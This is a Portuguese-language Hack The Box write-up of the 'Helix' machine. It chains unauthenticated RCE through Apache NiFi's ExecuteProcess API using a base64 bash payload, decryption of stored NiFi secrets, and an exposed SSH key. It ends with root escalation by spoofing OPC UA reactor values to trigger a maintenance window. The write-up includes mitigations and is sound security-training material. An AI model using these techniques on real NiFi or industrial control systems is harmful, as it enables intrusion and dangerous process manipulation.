# Hack The Box — Helix

![HTB](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
![OS](https://img.shields.io/badge/OS-Linux-orange)
![Category](https://img.shields.io/badge/Category-Web%20%7C%20Apache%20NiFi%20RCE%20%7C%20OT%20%2F%20OPC--UA%20%7C%20Privilege%20Escalation-blue)

---

# Informações da Máquina

| Nome | Dificuldade | Plataforma | OS |
| ---- | ----------- | ---------- | -- |
| Helix | Medium | Hack The Box | Linux (Ubuntu) |

O alvo se apresenta como a **Helix Industries**, uma empresa fictícia de automação industrial e infraestrutura crítica. O cenário mistura uma stack web moderna (Apache NiFi) com um ambiente **OT (Operational Technology)** simulado: um CLP (PLC) falando **OPC UA**, um controlador de segurança e uma HMI de reator nuclear.

---

# Superfície de Ataque

1. Enumeração com Nmap: SSH (22) e nginx (80), com redirecionamento para o vhost `helix.htb`
2. Descoberta do subdomínio `flow.helix.htb` hospedando um **Apache NiFi 1.21.0**
3. NiFi configurado com **acesso anônimo e permissão `execute-code`** → RCE não autenticado via REST API
4. Execução de comandos como o usuário `nifi`, com captura de saída pela própria fila de flowfiles (sem necessidade de egress)
5. Descoberta de uma **chave SSH privada do usuário `operator`** exposta nos *support-bundles* do NiFi
6. Acesso via SSH como `operator` e captura da user flag
7. `operator` pode rodar `helix-maint-console` como root (sudo NOPASSWD), porém apenas com uma **janela de manutenção** aberta
8. A janela é aberta pelo controlador de segurança (root) ao detectar uma **condição perigosa em modo de teste** no reator
9. Manipulação do **servidor OPC UA** (CLP) para forçar essa condição e abrir a janela
10. Escalação para `root` via `helix-maint-console` durante a janela e captura da root flag

---

# Reconhecimento

A enumeração inicial com Nmap identificou apenas duas portas abertas.

```bash
nmap -p- --min-rate 2000 -T4 10.129.14.245
nmap -sC -sV -p22,80 10.129.14.245
```

**Resultado (resumido):**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://helix.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

O servidor web redireciona para `http://helix.htb/`, indicando roteamento por **virtual host**. A entrada foi adicionada ao `/etc/hosts`:

```
10.129.14.245 helix.htb flow.helix.htb
```

---

# Enumeração Web

O site principal (`helix.htb`) é institucional — uma landing page da "Helix Industries". O passo decisivo foi o **fuzzing de vhosts**, que revelou um subdomínio adicional:

```bash
ffuf -u http://10.129.14.245/ -H 'Host: FUZZ.helix.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

```
flow                    [Status: 200]
```

Acessando `http://flow.helix.htb/`, a aplicação se identifica como **Apache NiFi**, redirecionando para `/nifi/`.

---

# Foothold — RCE não autenticado no Apache NiFi

### Identificação e configuração permissiva

A API REST do NiFi entrega versão e, mais importante, o modelo de autenticação:

```bash
curl -s http://flow.helix.htb/nifi-api/flow/about
# {"about":{"title":"NiFi","version":"1.21.0", ... }}

curl -s http://flow.helix.htb/nifi-api/access/config
# {"config":{"supportsLogin":false}}

curl -s http://flow.helix.htb/nifi-api/flow/current-user
```

O endpoint `current-user` é o achado crítico — o usuário **anônimo** possui permissões totais, incluindo `execute-code` e acesso ao filesystem:

```json
{
  "identity": "anonymous",
  "anonymous": true,
  "provenancePermissions": {"canRead": true, "canWrite": true},
  "controllerPermissions": {"canRead": true, "canWrite": true},
  "componentRestrictionPermissions": [
    {"requiredPermission": {"id": "execute-code", "label": "execute code"}, "permissions": {"canRead": true, "canWrite": true}},
    {"requiredPermission": {"id": "write-filesystem", "label": "write filesystem"}, "permissions": {"canRead": true, "canWrite": true}}
  ]
}
```

`supportsLogin:false` + permissões totais para o anônimo = **execução de código remota não autenticada**. Não é uma CVE específica, e sim uma configuração indevida: qualquer um pode criar e executar processadores arbitrários.

### Técnica: ExecuteProcess + captura via fila de flowfiles

O fluxo de exploração via API REST:

1. Criar um processador `org.apache.nifi.processors.standard.ExecuteProcess`
2. Configurá-lo com `Command=/bin/bash` e os argumentos do payload
3. Conectar a relação `success` a um *funnel*
4. Iniciar (`RUNNING`), aguardar, parar (`STOPPED`)
5. Ler o flowfile resultante da fila via `flowfile-queues/{id}/listing-requests` + `/flowfiles/{uuid}/content`

Esse último passo é a chave do ambiente: o alvo **não tem rota de saída para a VPN do atacante** (interface única `10.129.14.245/16`). Reverse shells e exfiltração HTTP simplesmente travam. A solução foi **capturar o stdout pela própria fila interna do NiFi**, sem depender de nenhum tráfego de saída.

Dois detalhes importantes do NiFi 1.21:

* O `ExecuteProcess` separa os argumentos por **espaço** por padrão. Para passar um comando complexo a `bash -c`, é necessário definir a propriedade `Argument Delimiter` como `;`.
* O Linux impõe um limite de **128 KB por argumento** (`MAX_ARG_STRLEN`) no `execve`. Payloads grandes precisam ser fragmentados.

Para contornar o `;` como delimitador e caracteres especiais, o payload real era codificado em base64:

```
Command:           /bin/bash
Argument Delimiter: ;
Command Arguments: -c;echo <BASE64_DO_PAYLOAD>|base64 -d|bash
```

**Confirmação de RCE:**

```
uid=998(nifi) gid=998(nifi) groups=998(nifi)
Linux helix 5.15.0-164-generic #174-Ubuntu SMP x86_64 GNU/Linux
```

---

# Enumeração como `nifi`

Com execução de comando como `nifi`, o mapeamento do host revelou o ambiente OT e, principalmente, o caminho para o próximo usuário.

**Serviços locais (não expostos externamente):**

```
LISTEN 127.0.0.1:8081   (helix-hmi, Flask/Werkzeug)
LISTEN 127.0.0.1:8080   (NiFi)
LISTEN 127.0.0.1:4840   (OPC UA — helix-plc)
```

**Processos da aplicação Helix:**

```
plc       /opt/helix/bin/helix-plc       # servidor OPC UA (CLP)
www-data  /opt/helix/bin/helix-hmi       # HMI Flask do reator
root      /opt/helix/bin/helix-safety     # controlador de segurança
```

O diretório `/opt/helix` (root:helixsvc, `drwxr-x---`) não era legível pelo `nifi`, mas os flows do NiFi e os *support-bundles* estavam acessíveis.

### Credencial cifrada no flow (pista falsa)

O `flow.xml.gz` continha um *controller service* `DBCPConnectionPool` chamado `MaintenanceDB` com usuário `operator` e senha cifrada:

```
Database User: operator
Password: enc{05954f46...6730b8}
```

A `nifi.sensitive.props.key` estava em claro no `nifi.properties`:

```
nifi.sensitive.props.key=TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl
nifi.sensitive.props.algorithm=NIFI_PBKDF2_AES_GCM_256
```

Usando as próprias bibliotecas do NiFi presentes na máquina (`nifi-property-encryptor-1.21.0.jar`), um pequeno programa Java descriptografou a senha:

```java
PropertyEncryptor e = new PropertyEncryptorBuilder("TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl")
    .setAlgorithm("NIFI_PBKDF2_AES_GCM_256").build();
System.out.println(e.decrypt("05954f46...6730b8"));
// R7qZ9L3xKM2W8pFYcA
```

Essa senha (`R7qZ9L3xKM2W8pFYcA`), no entanto, **não funciona** para o usuário `operator` do sistema — é apenas a senha do banco H2 em memória. Uma pista falsa realista.

### O caminho real: chave SSH do operator exposta

Uma varredura por credenciais e chaves nos diretórios legíveis encontrou:

```bash
grep -rniE 'BEGIN OPENSSH|BEGIN RSA' /opt 2>/dev/null
```

```
/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak: -----BEGIN OPENSSH PRIVATE KEY-----
```

O arquivo (`-rw-r----- nifi nifi`) é uma **chave privada SSH do `operator`**, com o comentário `root@management`:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
...
-----END OPENSSH PRIVATE KEY-----
```

---

# Acesso Inicial (User)

Com a chave privada, o login como `operator` foi direto:

```bash
chmod 600 operator_key
ssh -i operator_key operator@10.129.14.245
```

```
uid=1001(operator) gid=1001(operator) groups=1001(operator)
operator@helix:~$
```

### User Flag

**Local:** `/home/operator/user.txt`

```
8fdff9.....................
```

---

# Escalação de Privilégios via OPC UA e a Janela de Manutenção

Como `operator`, o `sudo -l` revelou o vetor de root:

```
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

O script `helix-maint-console` (legível pelo grupo `operator`) só concede o shell de root se uma **janela de manutenção** estiver aberta:

```bash
#!/bin/bash
set -euo pipefail
FLAG="/opt/helix/state/maintenance_window"

window_ok() {
  [ -f "$FLAG" ] || return 1
  local until_ts now
  until_ts="$(cat "$FLAG")"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
}

if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi

echo "[+] Privileged maintenance access granted"
# Shell root interativo em um scope systemd, anexado à TTY
systemd-run --quiet --scope --unit="helix-maint-$$" \
  --property=KillMode=control-group --property=SendSIGHUP=yes \
  /bin/bash -p -i
```

A janela (`/opt/helix/state/maintenance_window`, contendo um timestamp futuro) é criada pelo `helix-safety` (root). Pela HMI (`http://127.0.0.1:8081`) descobre-se a regra de negócio:

> *"This window is granted by the safety controller only when a hazardous test condition is detected (e.g., Temp ≥ 295 °C or Pressure ≥ 73 bar) while still below trip."*

Ou seja: é preciso colocar o reator em uma **condição perigosa, em modo de teste**, manipulando o **CLP via OPC UA**.

### Mapeando o servidor OPC UA

O servidor OPC UA (`opc.tcp://127.0.0.1:4840/helix/`, FreeOpcUa) é acessível pelo localhost. Como a máquina não tinha biblioteca OPC UA nem acesso à internet, a lib pura-Python **`asyncua`** foi transferida em fragmentos base64 pelo canal de RCE do NiFi e importada via `zipimport`.

O *address space* expôs os nós graváveis do reator (UserAccessLevel = leitura+escrita):

```
Plant.Reactor.CalibrationOffset  [ns=2;i=6]   Double   (Temp = TemperatureRaw + offset)
Plant.Safety.RodsInserted        [ns=2;i=8]   Boolean
Plant.Safety.EmergencyCooling    [ns=2;i=9]   Boolean
Plant.Control.Mode               [ns=2;i=12]  String
Plant.Control.TestOverride       [ns=2;i=13]  Boolean
Plant.Control.ResetTrip          [ns=2;i=14]  Boolean
```

### A condição correta

A HMI calcula um estado interno chamado **"Test Mode Active"**, que é o gatilho real para o controlador interpretar o perigo como um *teste* (e abrir a janela) em vez de uma emergência real (e inserir as barras de controle). Variando os valores empiricamente, descobriu-se a combinação:

```
Test Mode Active = YES   <=>   Mode == "MAINTENANCE"  AND  TestOverride == True
```

Tentativas anteriores com `Mode == "TEST"` faziam o controlador tratar o pico de temperatura como emergência real, inserindo as barras e mantendo a janela fechada.

A sequência vencedora, escrita via OPC UA:

```python
Mode              <- "MAINTENANCE"
TestOverride      <- True
CalibrationOffset <- 12.0          # TemperatureRaw ~284 + 12 = ~296 °C (>= 295, abaixo do trip)
```

Após alguns segundos, o `helix-safety` (root) cria o arquivo da janela e a HMI passa a reportar:

```
Privileged Maintenance Window — Status: OPEN (~119s)
```

### Obtendo root

Com a janela aberta (validade ~120 s), o `helix-maint-console` é executado via sudo, em uma sessão com PTY, alimentando comandos para o shell de root resultante:

```bash
printf 'cat /root/root.txt\nexit\n' | \
  ssh -tt -i operator_key operator@10.129.14.245 \
  'sudo /usr/local/sbin/helix-maint-console'
```

```
[+] Privileged maintenance access granted
[!] Window expires in 112 seconds
root@helix:/home/operator# id
uid=0(root) gid=0(root) groups=0(root)
root@helix:/home/operator# cat /root/root.txt
```

### Root Flag

**Local:** `/root/root.txt`

```
7b77bd.....................
```

---

# Análise de Vulnerabilidades

### 1. Apache NiFi com Acesso Anônimo e `execute-code`

O NiFi estava sem autenticação (`supportsLogin:false`) e concedia ao usuário anônimo permissões totais, incluindo a permissão restrita `execute-code`. Qualquer pessoa com acesso à interface podia criar processadores `ExecuteProcess`/`ExecuteScript` e executar comandos arbitrários no host.

**Impacto:** Execução remota de código não autenticada como o usuário de serviço `nifi`.

**Mitigação:**

* Habilitar autenticação no NiFi (single-user, LDAP, OIDC, mTLS) e nunca expor a instância sem login
* Não conceder políticas de acesso ao identity anônimo; restringir as *restricted components* (`execute-code`, `write-filesystem`)
* Segmentar a rede e rodar o serviço com o mínimo de privilégios

### 2. Credencial Sensível Recuperável (chave de criptografia em claro)

A senha do banco no flow estava cifrada, mas a `nifi.sensitive.props.key` ficava em texto puro no `nifi.properties`, legível pelo usuário do serviço. Com a chave e as bibliotecas do próprio NiFi, qualquer segredo do flow é trivialmente descriptografado.

**Impacto:** Exposição de credenciais armazenadas nos fluxos.

**Mitigação:**

* Proteger a `sensitive.props.key` (proteção por HSM/Vault, `nifi.sensitive.props.key.protected`)
* Restringir as permissões de leitura dos arquivos de configuração do NiFi
* Rotacionar segredos e evitar reuso de credenciais entre serviços

### 3. Chave Privada SSH Exposta em Diretório Legível

Uma chave privada SSH do usuário `operator` foi deixada em `/opt/nifi-1.21.0/support-bundles/`, legível pelo usuário `nifi`. Isso transformou um RCE de baixo privilégio em acesso interativo direto a uma conta de usuário real.

**Impacto:** Movimentação lateral de `nifi` para `operator`.

**Mitigação:**

* Nunca armazenar chaves privadas em diretórios de aplicação ou *bundles* de diagnóstico
* Restringir permissões e auditar artefatos de suporte antes de deixá-los no disco
* Usar chaves com passphrase e rotacioná-las após exposição

### 4. Controle de Acesso OT Inseguro (OPC UA sem autenticação)

O CLP expunha o servidor OPC UA permitindo escrita anônima em variáveis críticas de segurança do reator (temperatura calibrada, modo, override de teste). Um usuário com acesso ao localhost conseguia falsificar uma condição de perigo controlada e induzir o controlador de segurança (root) a abrir uma janela privilegiada.

**Impacto:** Manipulação do processo industrial e abertura indevida de uma janela de manutenção privilegiada, viabilizando a escalação para root.

**Mitigação:**

* Exigir autenticação e *security policies* (Sign/Encrypt) no servidor OPC UA; jamais permitir escrita anônima
* Aplicar controle de acesso por nó e validação de sanidade nos valores recebidos do CLP
* Não acoplar decisões de segurança de TI (abertura de janela de root) diretamente a sinais de processo manipuláveis
* Tratar a lógica de "modo de teste" como confiável apenas a partir de fonte autenticada

### 5. Caminho `sudo` Condicionado a um Arquivo de Estado Manipulável

O `helix-maint-console` (sudo NOPASSWD para `operator` → root) baseava sua decisão em um arquivo de estado criado por outro serviço, cuja criação podia ser disparada por entrada não confiável (OPC UA). A cadeia inteira de confiança era controlável pelo atacante.

**Impacto:** Escalação de `operator` para `root`.

**Mitigação:**

* Reduzir comandos com sudo NOPASSWD ao mínimo e validar rigorosamente o contexto de execução
* Não conceder shells interativos de root a partir de scripts de manutenção
* Garantir que gatilhos de privilégio não dependam de estado influenciável por usuários de baixo privilégio

---

# Ferramentas Utilizadas

* **Nmap**, port scanning e fingerprinting de serviços
* **FFUF**, fuzzing de virtual hosts
* **cURL**, interação com a REST API do NiFi
* **API REST do NiFi**, criação de processadores e captura de saída via fila de flowfiles
* **Java (NiFi PropertyEncryptor)**, descriptografia da senha sensível do flow
* **asyncua** (cliente OPC UA em Python), leitura e escrita nos nós do CLP
* **SSH**, acesso como `operator` e sessão com PTY para o console de manutenção

---

# Cadeia de Exploração

```
[Reconhecimento: Nmap]  ->  SSH(22) + nginx(80) -> vhost helix.htb
    |
    v
[Fuzzing de vhost: flow.helix.htb -> Apache NiFi 1.21.0]
    |
    v
[NiFi anonimo + execute-code -> RCE como nifi]
    |  (saida capturada pela fila de flowfiles; sem egress)
    |
    +--> [sensitive.props.key -> descriptografa senha DBCP (pista falsa)]
    |
    +--> [/opt/nifi/support-bundles/operator_id_ed25519.bak -> chave SSH do operator]
    |
    v
[SSH como operator  ->  User Flag]
    |
    v
[sudo NOPASSWD: helix-maint-console  (requer janela de manutencao)]
    |
    v
[OPC UA: Mode=MAINTENANCE + TestOverride=True + CalibrationOffset (Temp>=295)]
    |   -> helix-safety (root) abre a janela
    v
[sudo helix-maint-console com a janela aberta -> shell root -> Root Flag]
```

---

# Principais Aprendizados

1. **Fuzzing de vhost abre portas escondidas:** o serviço realmente interessante (NiFi) só aparecia sob um subdomínio. A landing page principal era apenas fachada.

2. **Configuração indevida vale tanto quanto CVE:** o NiFi não precisou de exploit; o acesso anônimo com `execute-code` já era um RCE completo. Leia as permissões da aplicação, não só a versão.

3. **Sem egress, use o canal que você já tem:** com o alvo isolado da VPN, a saída dos comandos foi exfiltrada pela própria fila interna do NiFi. Nem todo RCE precisa de reverse shell.

4. **Segredo cifrado com a chave ao lado não é segredo:** a `sensitive.props.key` em claro tornou a senha do flow recuperável — mas ela era uma isca. Diferenciar a credencial útil da pista falsa economiza tempo.

5. **Artefatos de diagnóstico vazam credenciais:** uma chave SSH esquecida em um *support-bundle* foi a verdadeira ponte de `nifi` para `operator`.

6. **OT é superfície de ataque:** decisões de segurança de TI (abrir uma janela de root) não devem depender de sinais de processo industrial manipuláveis. Escrever em um nó OPC UA sem autenticação induziu um serviço root a conceder privilégio.

---

# Timeline de Exploração

| Etapa | Ação | Resultado |
|-------|------|-----------|
| 00:00 | Nmap scan | SSH (22) e nginx (80) → vhost `helix.htb` |
| 00:05 | Fuzzing de vhost | `flow.helix.htb` → Apache NiFi 1.21.0 |
| 00:15 | Análise da API do NiFi | Acesso anônimo com `execute-code` |
| 00:25 | RCE via ExecuteProcess | Execução de comando como `nifi` |
| 00:40 | Enumeração local | Ambiente OT + chave SSH do operator em support-bundles |
| 00:50 | SSH como operator | User flag capturada |
| 01:05 | Análise do helix-maint-console | sudo→root condicionado à janela de manutenção |
| 01:25 | Cliente OPC UA (asyncua) | Mapeamento dos nós do reator |
| 01:40 | Manipulação do CLP | Janela de manutenção aberta (Mode=MAINTENANCE + TestOverride + Temp≥295) |
| 01:45 | sudo helix-maint-console | Root flag capturada |

---

# Autor

Exploração e documentação realizadas como parte do currículo de Information Security.

**GitHub:** [https://github.com/ninjaa-exe]

---

# Referências e Recursos

- [Apache NiFi — Security Configuration](https://nifi.apache.org/docs/nifi-docs/html/administration-guide.html#security_configuration)
- [Apache NiFi REST API](https://nifi.apache.org/docs/nifi-docs/rest-api/index.html)
- [OPC UA Security (OPC Foundation)](https://opcfoundation.org/about/opc-technologies/opc-ua/)
- [FreeOpcUa / asyncua](https://github.com/FreeOpcUa/opcua-asyncio)
- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
